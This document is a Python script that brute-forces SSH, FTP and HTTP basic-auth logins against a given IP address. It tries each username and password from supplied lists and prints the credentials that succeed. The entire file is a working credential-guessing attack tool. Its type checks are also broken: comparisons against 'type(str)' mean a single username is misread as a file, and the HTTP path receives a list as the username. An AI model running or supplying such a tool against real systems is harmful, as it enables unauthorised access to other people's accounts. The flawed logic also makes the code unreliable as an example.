import argparse
import paramiko
import ftplib
import requests
import sys
import time

def parse_arguments():
    parser = argparse.ArgumentParser(description="Brute-force SSH, FTP, and HTTP")
    parser.add_argument("-c", "--command", required=True, choices=["ssh", "ftp", "http"], help="Command type (ssh/ftp/http)")
    parser.add_argument("-ip", "--ip", required=True, help="Target IP address")
    parser.add_argument("-u", "--username", required=True, help="Username (can be a file or a single string)")
    parser.add_argument("-p", "--passwords", required=True, help="Password file or list of passwords")
    return parser.parse_args()


def read_username(string_or_file_path):
    if string_or_file_path != type(str):    
        try:
            with open(string_or_file_path, 'r') as f:
                return [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(f"Error: Password file '{string_or_file_path}' not found.")
            sys.exit(1)
    else:
        return string_or_file_path

def read_passwords(file_path):
    try:
        with open(file_path, 'r') as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"Error: Password file '{file_path}' not found.")
        sys.exit(1)

def brute_ssh(ip, username, passwords):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    if username == type(str):
        for pwd in passwords:
            try:
                ssh.connect(ip, username=username, password=pwd, timeout=5)
                print(f"[SSH] Success: {username}:{pwd}")
                ssh.close()
                return
            except paramiko.AuthenticationException:
                print(f"[SSH] Failed: {username}:{pwd}")
            except Exception as e:
                print(f"[SSH] Error: {e}")
                time.sleep(1)
        print(f"[SSH] No password found for {username} on {ip}")
    else:
        for usr in username:
            passwordFound = False
            for pwd in passwords:
                try:
                    ssh.connect(ip, username=usr, password=pwd, timeout=5)
                    print(f"[SSH] Success: {usr}:{pwd}")
                    ssh.close()
                    passwordFound = True
                    break
                except paramiko.AuthenticationException:
                    print(f"[SSH] Failed: {usr}:{pwd}")
                except Exception as e:
                    print(f"[SSH] Error: {e}")
                    time.sleep(1)                    
            if passwordFound == False:
                print(f"[SSH] No password found for {usr} on {ip}")

def brute_ftp(ip, username, passwords):
    if username == type(str):
        for pwd in passwords:
            try:
                ftp = ftplib.FTP(ip)
                ftp.login(username, pwd)
                print(f"[FTP] Success: {username}:{pwd}")
                ftp.quit()
                return
            except ftplib.error_perm:
                print(f"[FTP] Failed: {username}:{pwd}")
            except Exception as e:
                print(f"[FTP] Error: {e}")
                time.sleep(1)
        print(f"[FTP] No password found for {username} on {ip}")
    else:
        for usr in username:
            passwordFound = False
            for pwd in passwords:
                try:
                    ftp = ftplib.FTP(ip)
                    ftp.login(usr, pwd)
                    print(f"[FTP] Success: {usr}:{pwd}")
                    ftp.quit()
                    passwordFound = True
                    break
                except ftplib.error_perm:
                    print(f"[FTP] Failed: {usr}:{pwd}")
                except Exception as e:
                    print(f"[FTP] Error: {e}")
                    time.sleep(1)
            if passwordFound == False:
                print(f"[FTP] No password found for {usr} on {ip}")

def brute_http(ip, username, passwords):
    for pwd in passwords:
        url = f"http://{ip}/"
        try:
            response = requests.get(url, auth=(username, pwd), timeout=5)
            if response.status_code == 200:
                print(f"[HTTP] Success: {username}:{pwd}")
                return
            else:
                print(f"[HTTP] Failed: {username}:{pwd}")
        except requests.exceptions.RequestException as e:
            print(f"[HTTP] Error: {e}")
            time.sleep(1)
    print(f"[HTTP] No password found for {username} on {ip}")

def main():
    args = parse_arguments()
    passwords = read_passwords(args.passwords)
    username = read_username(args.username)
    
    if args.command == "ssh":
        brute_ssh(args.ip, username, passwords)
    elif args.command == "ftp":
        brute_ftp(args.ip, username, passwords)
    elif args.command == "http":
        brute_http(args.ip, username, passwords)

if __name__ == "__main__":
    main()
